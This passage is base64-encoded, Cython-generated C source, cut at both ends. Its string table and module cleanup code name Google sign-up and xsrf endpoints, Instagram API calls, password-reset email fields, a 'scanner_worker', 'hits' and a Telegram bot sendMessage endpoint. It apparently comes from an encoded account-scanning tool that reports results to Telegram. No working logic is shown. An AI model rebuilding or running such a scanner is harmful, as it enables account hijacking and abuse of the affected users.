9zdHJpbmdfdGFiWzIyMV0KI2RlZmluZSBfX3B5eF9uX3VfZGlnaXRzIF9fcHl4X3N0cmluZ190YWJbMjIyXQojZGVmaW5lIF9fcHl4X2twX3VfZGlzYWJsZSBfX3B5eF9zdHJpbmdfdGFiWzIyM10KI2RlZmluZSBfX3B5eF9uX3VfZG50IF9fcHl4X3N0cmluZ190YWJbMjI0XQojZGVmaW5lIF9fcHl4X25fdV9kb2MgX19weXhfc3RyaW5nX3RhYlsyMjVdCiNkZWZpbmUgX19weXhfbl91X2RvY19pZCBfX3B5eF9zdHJpbmdfdGFiWzIyNl0KI2RlZmluZSBfX3B5eF9uX3VfZG9uZSBfX3B5eF9zdHJpbmdfdGFiWzIyN10KI2RlZmluZSBfX3B5eF9rcF91X2RwaSBfX3B5eF9zdHJpbmdfdGFiWzIyOF0KI2RlZmluZSBfX3B5eF9uX3VfZHBpXzIgX19weXhfc3RyaW5nX3RhYlsyMjldCiNkZWZpbmUgX19weXhfbl91X2R1bXBzIF9fcHl4X3N0cmluZ190YWJbMjMwXQojZGVmaW5lIF9fcHl4X25fdV9lIF9fcHl4X3N0cmluZ190YWJbMjMxXQojZGVmaW5lIF9fcHl4X25fdV9lbWFpbCBfX3B5eF9zdHJpbmdfdGFiWzIzMl0KI2RlZmluZSBfX3B5eF9rcF91X2VuX0dCX2VuX1VTIF9fcHl4X3N0cmluZ190YWJbMjMzXQojZGVmaW5lIF9fcHl4X2twX3VfZW5fVVNfZW5fcV8wXzkgX19weXhfc3RyaW5nX3RhYlsyMzRdCiNkZWZpbmUgX19weXhfa3BfdV9lbl9lbl9VU19xXzBfOSBfX3B5eF9zdHJpbmdfdGFiWzIzNV0KI2RlZmluZSBfX3B5eF9rcF91X2VuYWJsZSBfX3B5eF9zdHJpbmdfdGFiWzIzNl0KI2RlZmluZSBfX3B5eF9uX3VfZW5kIF9fcHl4X3N0cmluZ190YWJbMjM3XQojZGVmaW5lIF9fcHl4X25fdV9lbmRzd2l0aCBfX3B5eF9zdHJpbmdfdGFiWzIzOF0KI2RlZmluZSBfX3B5eF9uX3VfZW50ZXIgX19weXhfc3RyaW5nX3RhYlsyMzldCiNkZWZpbmUgX19weXhfbl91X2V4ZWN1dG9yIF9fcHl4X3N0cmluZ190YWJbMjQwXQojZGVmaW5lIF9fcHl4X25fdV9leGl0IF9fcHl4X3N0cmluZ190YWJbMjQxXQojZGVmaW5lIF9fcHl4X25fdV9mIF9fcHl4X3N0cmluZ190YWJbMjQyXQojZGVmaW5lIF9fcHl4X2twX3VfZl9yZXEgX19weXhfc3RyaW5nX3RhYlsyNDNdCiNkZWZpbmUgX19weXhfbl91X2ZiX2FwaV9jYWxsZXJfY2xhc3MgX19weXhfc3RyaW5nX3RhYlsyNDRdCiNkZWZpbmUgX19weXhfbl91X2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzI0NV0KI2RlZmluZSBfX3B5eF9uX3VfZmlsdGVyZWQgX19weXhfc3RyaW5nX3RhYlsyNDZdCiNkZWZpbmUgX19weXhfbl91X2ZvbGxvd2VyX2NvdW50IF9fcHl4X3N0cmluZ190YWJbMjQ3XQojZGVmaW5lIF9fcHl4X25fdV9mb2xsb3dpbmdfY291bnQgX19weXhfc3RyaW5nX3RhYlsyNDhdCiNkZWZpbmUgX19weXhfbl91X2ZvbnQgX19weXhfc3RyaW5nX3RhYlsyNDldCiNkZWZpbmUgX19weXhfbl91X2Zvd2cgX19weXhfc3RyaW5nX3RhYlsyNTBdCiNkZWZpbmUgX19weXhfbl91X2Zvd3MgX19weXhfc3RyaW5nX3RhYlsyNTFdCiNkZWZpbmUgX19weXhfbl91X2Z1bGxfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzI1Ml0KI2RlZmluZSBfX3B5eF9uX3VfZnVuYyBfX3B5eF9zdHJpbmdfdGFiWzI1M10KI2RlZmluZSBfX3B5eF9uX3VfZnV0dXJlIF9fcHl4X3N0cmluZ190YWJbMjU0XQojZGVmaW5lIF9fcHl4X25fdV9mdXR1cmVfdG9fd29ya2VyIF9fcHl4X3N0cmluZ190YWJbMjU1XQojZGVmaW5lIF9fcHl4X2twX3VfZ2MgX19weXhfc3RyaW5nX3RhYlsyNTZdCiNkZWZpbmUgX19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQgX19weXhfc3RyaW5nX3RhYlsyNTddCiNkZWZpbmUgX19weXhfbl91X2dlbmVyYXRlX3VzZXJfaWQgX19weXhfc3RyaW5nX3RhYlsyNThdCiNkZWZpbmUgX19weXhfbl91X2dlbmV4cHIgX19weXhfc3RyaW5nX3RhYlsyNTldCiNkZWZpbmUgX19weXhfbl91X2dldCBfX3B5eF9zdHJpbmdfdGFiWzI2MF0KI2RlZmluZSBfX3B5eF9uX3VfZ2V0X2NvdW50ZXIgX19weXhfc3RyaW5nX3RhYlsyNjFdCiNkZWZpbmUgX19weXhfbl91X2dldF9kaWN0IF9fcHl4X3N0cmluZ190YWJbMjYyXQojZGVmaW5lIF9fcHl4X2twX3VfZ2ZfdWFyXzEgX19weXhfc3RyaW5nX3RhYlsyNjNdCiNkZWZpbmUgX19weXhfbl91X2dnIF9fcHl4X3N0cmluZ190YWJbMjY0XQojZGVmaW5lIF9fcHl4X25fdV9nZ2IgX19weXhfc3RyaW5nX3RhYlsyNjVdCiNkZWZpbmUgX19weXhfa3BfdV9nbWFpbF9jb20gX19weXhfc3RyaW5nX3RhYlsyNjZdCiNkZWZpbmUgX19weXhfbl91X2dvb2RpZyBfX3B5eF9zdHJpbmdfdGFiWzI2N10KI2RlZmluZSBfX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmIF9fcHl4X3N0cmluZ190YWJbMjY4XQojZGVmaW5lIF9fcHl4X25fdV9ncm91cCBfX3B5eF9zdHJpbmdfdGFiWzI2OV0KI2RlZmluZSBfX3B5eF9uX3VfZ3VpZCBfX3B5eF9zdHJpbmdfdGFiWzI3MF0KI2RlZmluZSBfX3B5eF9rcF91X2d6aXBfZGVmbGF0ZSBfX3B5eF9zdHJpbmdfdGFiWzI3MV0KI2RlZmluZSBfX3B5eF9uX3VfaGFzaGxpYiBfX3B5eF9zdHJpbmdfdGFiWzI3Ml0KI2RlZmluZSBfX3B5eF9uX3VfaGUzIF9fcHl4X3N0cmluZ190YWJbMjczXQojZGVmaW5lIF9fcHl4X25fdV9oZWFkZXJzIF9fcHl4X3N0cmluZ190YWJbMjc0XQojZGVmaW5lIF9fcHl4X25fdV9oZXhkaWdlc3QgX19weXhfc3RyaW5nX3RhYlsyNzVdCiNkZWZpbmUgX19weXhfbl91X2hpdHMgX19weXhfc3RyaW5nX3RhYlsyNzZdCiNkZWZpbmUgX19weXhfbl91X2hvc3QgX19weXhfc3RyaW5nX3RhYlsyNzddCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tIF9fcHl4X3N0cmluZ190YWJbMjc4XQojZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9fX3NpZ24gX19weXhfc3RyaW5nX3RhYlsyNzldCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yIF9fcHl4X3N0cmluZ190YWJbMjgwXQojZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWduaW4gX19weXhfc3RyaW5nX3RhYlsyODFdCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCBfX3B5eF9zdHJpbmdfdGFiWzI4Ml0KI2RlZmluZSBfX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIgX19weXhfc3RyaW5nX3RhYlsyODNdCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdCBfX3B5eF9zdHJpbmdfdGFiWzI4NF0KI2RlZmluZSBfX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjIF9fcHl4X3N0cmluZ190YWJbMjg1XQojZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfdF9tZV9HSE9TVF9SRlggX19weXhfc3RyaW5nX3RhYlsyODZdCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc190X21lX3Y2ZjRDNjFkMExOak5EWmggX19weXhfc3RyaW5nX3RhYlsyODddCiNkZWZpbmUgX19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbSBfX3B5eF9zdHJpbmdfdGFiWzI4OF0KI2RlZmluZSBfX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2FwaV9ncmFwIF9fcHl4X3N0cmluZ190YWJbMjg5XQojZGVmaW5lIF9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4gX19weXhfc3RyaW5nX3RhYlsyOTBdCiNkZWZpbmUgX19weXhfbl91X2kgX19weXhfc3RyaW5nX3RhYlsyOTFdCiNkZWZpbmUgX19weXhfa3BfdV9pX2luc3RhZ3JhbV9jb20gX19weXhfc3RyaW5nX3RhYlsyOTJdCiNkZWZpbmUgX19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiBfX3B5eF9zdHJpbmdfdGFiWzI5M10KI2RlZmluZSBfX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIgX19weXhfc3RyaW5nX3RhYlsyOTRdCiNkZWZpbmUgX19weXhfbl91X2luZm9pbnN0YSBfX3B5eF9zdHJpbmdfdGFiWzI5NV0KI2RlZmluZSBfX3B5eF9uX3VfaW5pdCBfX3B5eF9zdHJpbmdfdGFiWzI5Nl0KI2RlZmluZSBfX3B5eF9uX3VfaW5pdGlhbGl6aW5nIF9fcHl4X3N0cmluZ190YWJbMjk3XQojZGVmaW5lIF9fcHl4X25fdV9pbmxpbmVfa2V5Ym9hcmQgX19weXhfc3RyaW5nX3RhYlsyOThdCiNkZWZpbmUgX19weXhfbl91X2lucHV0IF9fcHl4X3N0cmluZ190YWJbMjk5XQojZGVmaW5lIF9fcHl4X25fdV9pc1ByYWlzZSBfX3B5eF9zdHJpbmdfdGFiWzMwMF0KI2RlZmluZSBfX3B5eF9uX3VfaXNfY29yb3V0aW5lIF9fcHl4X3N0cmluZ190YWJbMzAxXQojZGVmaW5lIF9fcHl4X25fdV9pc19wcml2YXRlIF9fcHl4X3N0cmluZ190YWJbMzAyXQojZGVmaW5lIF9fcHl4X25fdV9pc192ZXJpZmllZCBfX3B5eF9zdHJpbmdfdGFiWzMwM10KI2RlZmluZSBfX3B5eF9rcF91X2lzZW5hYmxlZCBfX3B5eF9zdHJpbmdfdGFiWzMwNF0KI2RlZmluZSBfX3B5eF9uX3VfaXRlbXMgX19weXhfc3RyaW5nX3RhYlszMDVdCiNkZWZpbmUgX19weXhfbl91X2pzb24gX19weXhfc3RyaW5nX3RhYlszMDZdCiNkZWZpbmUgX19weXhfbl91X2sgX19weXhfc3RyaW5nX3RhYlszMDddCiNkZWZpbmUgX19weXhfa3BfdV9rZWVwX2FsaXZlIF9fcHl4X3N0cmluZ190YWJbMzA4XQojZGVmaW5lIF9fcHl4X25fdV9rZXkgX19weXhfc3RyaW5nX3RhYlszMDldCiNkZWZpbmUgX19weXhfbl91X2xvY2sgX19weXhfc3RyaW5nX3RhYlszMTBdCiNkZWZpbmUgX19weXhfbl91X2xzZCBfX3B5eF9zdHJpbmdfdGFiWzMxMV0KI2RlZmluZSBfX3B5eF9uX3VfbHNkX3Rva2VuIF9fcHl4X3N0cmluZ190YWJbMzEyXQojZGVmaW5lIF9fcHl4X2twX3VfbV90Zl9weSBfX3B5eF9zdHJpbmdfdGFiWzMxM10KI2RlZmluZSBfX3B5eF9uX3VfbWFpbiBfX3B5eF9zdHJpbmdfdGFiWzMxNF0KI2RlZmluZSBfX3B5eF9uX3VfbWF0Y2ggX19weXhfc3RyaW5nX3RhYlszMTVdCiNkZWZpbmUgX19weXhfbl91X21heF93b3JrZXJzIF9fcHl4X3N0cmluZ190YWJbMzE2XQojZGVmaW5lIF9fcHl4X25fdV9tZDUgX19weXhfc3RyaW5nX3RhYlszMTddCiNkZWZpbmUgX19weXhfbl91X21lZGlhX2NvdW50IF9fcHl4X3N0cmluZ190YWJbMzE4XQojZGVmaW5lIF9fcHl4X25fdV9tZXRhIF9fcHl4X3N0cmluZ190YWJbMzE5XQojZGVmaW5lIF9fcHl4X25fdV9tZXRhY2xhc3MgX19weXhfc3RyaW5nX3RhYlszMjBdCiNkZWZpbmUgX19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCBfX3B5eF9zdHJpbmdfdGFiWzMyMV0KI2RlZmluZSBfX3B5eF9uX3VfbW9kZWxfbnVtYmVyIF9fcHl4X3N0cmluZ190YWJbMzIyXQojZGVmaW5lIF9fcHl4X25fdV9tb2R1bGUgX19weXhfc3RyaW5nX3RhYlszMjNdCiNkZWZpbmUgX19weXhfbl91X24xIF9fcHl4X3N0cmluZ190YWJbMzI0XQojZGVmaW5lIF9fcHl4X25fdV9uMiBfX3B5eF9zdHJpbmdfdGFiWzMyNV0KI2RlZmluZSBfX3B5eF9uX3VfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzMyNl0KI2RlZmluZSBfX3B5eF9uX3VfbmFtZV8yIF9fcHl4X3N0cmluZ190YWJbMzI3XQojZGVmaW5lIF9fcHl4X25fdV9uZXh0IF9fcHl4X3N0cmluZ190YWJbMzI4XQojZGVmaW5lIF9fcHl4X25fdV9udCBfX3B5eF9zdHJpbmdfdGFiWzMyOV0KI2RlZmluZSBfX3B5eF9rcF91X251bGwgX19weXhfc3RyaW5nX3RhYlszMzBdCiNkZWZpbmUgX19weXhfa3BfdV9udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsIF9fcHl4X3N0cmluZ190YWJbMzMxXQojZGVmaW5lIF9fcHl4X25fdV9vIF9fcHl4X3N0cmluZ190YWJbMzMyXQojZGVmaW5lIF9fcHl4X25fdV9vayBfX3B5eF9zdHJpbmdfdGFiWzMzM10KI2RlZmluZSBfX3B5eF9uX3Vfb3BlbiBfX3B5eF9zdHJpbmdfdGFiWzMzNF0KI2RlZmluZSBfX3B5eF9uX3Vfb3JpZ2luIF9fcHl4X3N0cmluZ190YWJbMzM1XQojZGVmaW5lIF9fcHl4X25fdV9vcmlnaW5hbF9lbWFpbCBfX3B5eF9zdHJpbmdfdGFiWzMzNl0KI2RlZmluZSBfX3B5eF9uX3Vfb3MgX19weXhfc3RyaW5nX3RhYlszMzddCiNkZWZpbmUgX19weXhfbl91X3BhcmFtcyBfX3B5eF9zdHJpbmdfdGFiWzMzOF0KI2RlZmluZSBfX3B5eF9uX3VfcGF5bG9hZCBfX3B5eF9zdHJpbmdfdGFiWzMzOV0KI2RlZmluZSBfX3B5eF9uX3VfcGsgX19weXhfc3RyaW5nX3RhYlszNDBdCiNkZWZpbmUgX19weXhfbl91X3BvcCBfX3B5eF9zdHJpbmdfdGFiWzM0MV0KI2RlZmluZSBfX3B5eF9uX3VfcG9zdCBfX3B5eF9zdHJpbmdfdGFiWzM0Ml0KI2RlZmluZSBfX3B5eF9uX3VfcHAgX19weXhfc3RyaW5nX3RhYlszNDNdCiNkZWZpbmUgX19weXhfbl91X3ByZXBhcmUgX19weXhfc3RyaW5nX3RhYlszNDRdCiNkZWZpbmUgX19weXhfbl91X3ByaW50IF9fcHl4X3N0cmluZ190YWJbMzQ1XQojZGVmaW5lIF9fcHl4X25fdV9wcmlvcml0eSBfX3B5eF9zdHJpbmdfdGFiWzM0Nl0KI2RlZmluZSBfX3B5eF9uX3VfcHl0eiBfX3B5eF9zdHJpbmdfdGFiWzM0N10KI2RlZmluZSBfX3B5eF9rcF91X3Fjb21fZW5fVVNfNTQ1OTg2IF9fcHl4X3N0cmluZ190YWJbMzQ4XQojZGVmaW5lIF9fcHl4X25fdV9xdWFsbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzM0OV0KI2RlZmluZSBfX3B5eF9uX3VfcXVlcnkgX19weXhfc3RyaW5nX3RhYlszNTBdCiNkZWZpbmUgX19weXhfbl91X3IgX19weXhfc3RyaW5nX3RhYlszNTFdCiNkZWZpbmUgX19weXhfbl91X3JhbmRpbnQgX19weXhfc3RyaW5nX3RhYlszNTJdCiNkZWZpbmUgX19weXhfbl91X3JhbmRvbSBfX3B5eF9zdHJpbmdfdGFiWzM1M10KI2RlZmluZSBfX3B5eF9uX3VfcmFuZHJhbmdlIF9fcHl4X3N0cmluZ190YWJbMzU0XQojZGVmaW5lIF9fcHl4X25fdV9yYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzM1NV0KI2RlZmluZSBfX3B5eF9uX3VfcmUgX19weXhfc3RyaW5nX3RhYlszNTZdCiNkZWZpbmUgX19weXhfbl91X3JlYWQgX19weXhfc3RyaW5nX3RhYlszNTddCiNkZWZpbmUgX19weXhfbl91X3JlZCBfX3B5eF9zdHJpbmdfdGFiWzM1OF0KI2RlZmluZSBfX3B5eF9uX3VfcmVmZXJlciBfX3B5eF9zdHJpbmdfdGFiWzM1OV0KI2RlZmluZSBfX3B5eF9uX3VfcmVuZGVyIF9fcHl4X3N0cmluZ190YWJbMzYwXQojZGVmaW5lIF9fcHl4X25fdV9yZXBseV9tYXJrdXAgX19weXhfc3RyaW5nX3RhYlszNjFdCiNkZWZpbmUgX19weXhfbl91X3JlcXVlc3RzIF9fcHl4X3N0cmluZ190YWJbMzYyXQojZGVmaW5lIF9fcHl4X25fdV9yZXMxIF9fcHl4X3N0cmluZ190YWJbMzYzXQojZGVmaW5lIF9fcHl4X25fdV9yZXNldF9lbWFpbCBfX3B5eF9zdHJpbmdfdGFiWzM2NF0KI2RlZmluZSBfX3B5eF9uX3VfcmVzb2x1dGlvbiBfX3B5eF9zdHJpbmdfdGFiWzM2NV0KI2RlZmluZSBfX3B5eF9uX3VfcmVzcG9uc2UgX19weXhfc3RyaW5nX3RhYlszNjZdCiNkZWZpbmUgX19weXhfbl91X3Jlc3QgX19weXhfc3RyaW5nX3RhYlszNjddCiNkZWZpbmUgX19weXhfbl91X3JyIF9fcHl4X3N0cmluZ190YWJbMzY4XQojZGVmaW5lIF9fcHl4X25fdV9ydW4gX19weXhfc3RyaW5nX3RhYlszNjldCiNkZWZpbmUgX19weXhfbl91X3J1bm5pbmcgX19weXhfc3RyaW5nX3RhYlszNzBdCiNkZWZpbmUgX19weXhfbl91X3NjYW5uZXIgX19weXhfc3RyaW5nX3RhYlszNzFdCiNkZWZpbmUgX19weXhfbl91X3NjYW5uZXJfd29ya2VyIF9fcHl4X3N0cmluZ190YWJbMzcyXQojZGVmaW5lIF9fcHl4X25fdV9zZWFyY2ggX19weXhfc3RyaW5nX3RhYlszNzNdCiNkZWZpbmUgX19weXhfbl91X3NlbGYgX19weXhfc3RyaW5nX3RhYlszNzRdCiNkZWZpbmUgX19weXhfbl91X3NlbmQgX19weXhfc3RyaW5nX3RhYlszNzVdCiNkZWZpbmUgX19weXhfa3BfdV9zZW5kTWVzc2FnZSBfX3B5eF9zdHJpbmdfdGFiWzM3Nl0KI2RlZmluZSBfX3B5eF9uX3Vfc2VydmVyX3RpbWVzdGFtcHMgX19weXhfc3RyaW5nX3RhYlszNzddCiNkZWZpbmUgX19weXhfbl91X3NldF9hY3RpdmVfdGhyZWFkcyBfX3B5eF9zdHJpbmdfdGFiWzM3OF0KI2RlZmluZSBfX3B5eF9uX3Vfc2V0X25hbWUgX19weXhfc3RyaW5nX3RhYlszNzldCiNkZWZpbmUgX19weXhfbl91X3NodXRkb3duIF9fcHl4X3N0cmluZ190YWJbMzgwXQojZGVmaW5lIF9fcHl4X25fdV9zaWduZWRfYm9keSBfX3B5eF9zdHJpbmdfdGFiWzM4MV0KI2RlZmluZSBfX3B5eF9uX3Vfc2xlZXAgX19weXhfc3RyaW5nX3RhYlszODJdCiNkZWZpbmUgX19weXhfbl91X3NwYWNlIF9fcHl4X3N0cmluZ190YWJbMzgzXQojZGVmaW5lIF9fcHl4X25fdV9zcGVjIF9fcHl4X3N0cmluZ190YWJbMzg0XQojZGVmaW5lIF9fcHl4X25fdV9zcGxpdCBfX3B5eF9zdHJpbmdfdGFiWzM4NV0KI2RlZmluZSBfX3B5eF9uX3Vfc3BsaXRsaW5lcyBfX3B5eF9zdHJpbmdfdGFiWzM4Nl0KI2RlZmluZSBfX3B5eF9uX3Vfc3MgX19weXhfc3RyaW5nX3RhYlszODddCiNkZWZpbmUgX19weXhfbl91X3N0YXJ0IF9fcHl4X3N0cmluZ190YWJbMzg4XQojZGVmaW5lIF9fcHl4X25fdV9zdGF0dXNfY29kZSBfX3B5eF9zdHJpbmdfdGFiWzM4OV0KI2RlZmluZSBfX3B5eF9uX3Vfc3RyaW5nIF9fcHl4X3N0cmluZ190YWJbMzkwXQojZGVmaW5lIF9fcHl4X25fdV9zdWJtaXQgX19weXhfc3RyaW5nX3RhYlszOTFdCiNkZWZpbmUgX19weXhfbl91X3N1bSBfX3B5eF9zdHJpbmdfdGFiWzM5Ml0KI2RlZmluZSBfX3B5eF9uX3Vfc3lzIF9fcHl4X3N0cmluZ190YWJbMzkzXQojZGVmaW5lIF9fcHl4X25fdV9zeXN0ZW0gX19weXhfc3RyaW5nX3RhYlszOTRdCiNkZWZpbmUgX19weXhfbl91X3Rlc3QgX19weXhfc3RyaW5nX3RhYlszOTVdCiNkZWZpbmUgX19weXhfbl91X3RleHQgX19weXhfc3RyaW5nX3RhYlszOTZdCiNkZWZpbmUgX19weXhfbl91X3RmIF9fcHl4X3N0cmluZ190YWJbMzk3XQojZGVmaW5lIF9fcHl4X25fdV90aHJlYWRpbmcgX19weXhfc3RyaW5nX3RhYlszOThdCiNkZWZpbmUgX19weXhfbl91X3Rocm93IF9fcHl4X3N0cmluZ190YWJbMzk5XQojZGVmaW5lIF9fcHl4X25fdV90aW1lIF9fcHl4X3N0cmluZ190YWJbNDAwXQojZGVmaW5lIF9fcHl4X25fdV90aW1lb3V0IF9fcHl4X3N0cmluZ190YWJbNDAxXQojZGVmaW5lIF9fcHl4X25fdV90bCBfX3B5eF9zdHJpbmdfdGFiWzQwMl0KI2RlZmluZSBfX3B5eF9uX3VfdGxfbWF0Y2ggX19weXhfc3RyaW5nX3RhYls0MDNdCiNkZWZpbmUgX19weXhfa3BfdV90bF90eHQgX19weXhfc3RyaW5nX3RhYls0MDRdCiNkZWZpbmUgX19weXhfbl91X3RsbCBfX3B5eF9zdHJpbmdfdGFiWzQwNV0KI2RlZmluZSBfX3B5eF9uX3VfdG9rIF9fcHl4X3N0cmluZ190YWJbNDA2XQojZGVmaW5lIF9fcHl4X25fdV90b2tlbiBfX3B5eF9zdHJpbmdfdGFiWzQwN10KI2RlZmluZSBfX3B5eF9uX3VfdG90YWwgX19weXhfc3RyaW5nX3RhYls0MDhdCiNkZWZpbmUgX19weXhfbl91X3RydWUgX19weXhfc3RyaW5nX3RhYls0MDldCiNkZWZpbmUgX19weXhfa3BfdV91XzFfaSBfX3B5eF9zdHJpbmdfdGFiWzQxMF0KI2RlZmluZSBfX3B5eF9uX3VfdWEgX19weXhfc3RyaW5nX3RhYls0MTFdCiNkZWZpbmUgX19weXhfbl91X3VpZCBfX3B5eF9zdHJpbmdfdGFiWzQxMl0KI2RlZmluZSBfX3B5eF9uX3VfdW5rbm93biBfX3B5eF9zdHJpbmdfdGFiWzQxM10KI2RlZmluZSBfX3B5eF9rcF91X3Vua25vd25fY29tIF9fcHl4X3N0cmluZ190YWJbNDE0XQojZGVmaW5lIF9fcHl4X25fdV91cmwgX19weXhfc3RyaW5nX3RhYls0MTVdCiNkZWZpbmUgX19weXhfbl91X3VzZXIgX19weXhfc3RyaW5nX3RhYls0MTZdCiNkZWZpbmUgX19weXhfbl91X3VzZXJJRCBfX3B5eF9zdHJpbmdfdGFiWzQxN10KI2RlZmluZSBfX3B5eF9rcF91X3VzZXJfYWdlbnQgX19weXhfc3RyaW5nX3RhYls0MThdCiNkZWZpbmUgX19weXhfbl91X3VzZXJfYWdlbnRfMiBfX3B5eF9zdHJpbmdfdGFiWzQxOV0KI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9pZCBfX3B5eF9zdHJpbmdfdGFiWzQyMF0KI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9pbmZvIF9fcHl4X3N0cmluZ190YWJbNDIxXQojZGVmaW5lIF9fcHl4X25fdV91c2VybmFtZSBfX3B5eF9zdHJpbmdfdGFiWzQyMl0KI2RlZmluZSBfX3B5eF9uX3VfdXVpIF9fcHl4X3N0cmluZ190YWJbNDIzXQojZGVmaW5lIF9fcHl4X25fdV91dWlkIF9fcHl4X3N0cmluZ190YWJbNDI0XQojZGVmaW5lIF9fcHl4X25fdV91dWlkNCBfX3B5eF9zdHJpbmdfdGFiWzQyNV0KI2RlZmluZSBfX3B5eF9uX3VfdmFsdWUgX19weXhfc3RyaW5nX3RhYls0MjZdCiNkZWZpbmUgX19weXhfbl91X3ZhbHVlcyBfX3B5eF9zdHJpbmdfdGFiWzQyN10KI2RlZmluZSBfX3B5eF9uX3VfdmFyaWFibGVzIF9fcHl4X3N0cmluZ190YWJbNDI4XQojZGVmaW5lIF9fcHl4X25fdV93IF9fcHl4X3N0cmluZ190YWJbNDI5XQojZGVmaW5lIF9fcHl4X25fdV93YWl0IF9fcHl4X3N0cmluZ190YWJbNDMwXQojZGVmaW5lIF9fcHl4X25fdV93ZWJicm93c2VyIF9fcHl4X3N0cmluZ190YWJbNDMxXQojZGVmaW5lIF9fcHl4X25fdV93aGl0ZSBfX3B5eF9zdHJpbmdfdGFiWzQzMl0KI2RlZmluZSBfX3B5eF9uX3Vfd2lkIF9fcHl4X3N0cmluZ190YWJbNDMzXQojZGVmaW5lIF9fcHl4X25fdV93b3JrZXJfaWQgX19weXhfc3RyaW5nX3RhYls0MzRdCiNkZWZpbmUgX19weXhfbl91X3dyaXRlIF9fcHl4X3N0cmluZ190YWJbNDM1XQojZGVmaW5lIF9fcHl4X25fdV94IF9fcHl4X3N0cmluZ190YWJbNDM2XQojZGVmaW5lIF9fcHl4X2twX3VfeF9mYl9mcmllbmRseV9uYW1lIF9fcHl4X3N0cmluZ190YWJbNDM3XQojZGVmaW5lIF9fcHl4X2twX3VfeF9mYl9sc2QgX19weXhfc3RyaW5nX3RhYls0MzhdCiNkZWZpbmUgX19weXhfbl91X3l5IF9fcHl4X3N0cmluZ190YWJbNDM5XQoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfbV9jbGVhcihQeU9iamVjdCAqbSkgewogIF9fcHl4X21zdGF0ZXR5cGUgKmNsZWFyX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pOwogIGlmICghY2xlYXJfbW9kdWxlX3N0YXRlKSByZXR1cm4gMDsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfYik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKTsKICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRAogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfRnVzZWRGdW5jdGlvblR5cGUpOwogICNlbmRpZgogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoTlVMTCk7CiAgI2VuZGlmCiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90e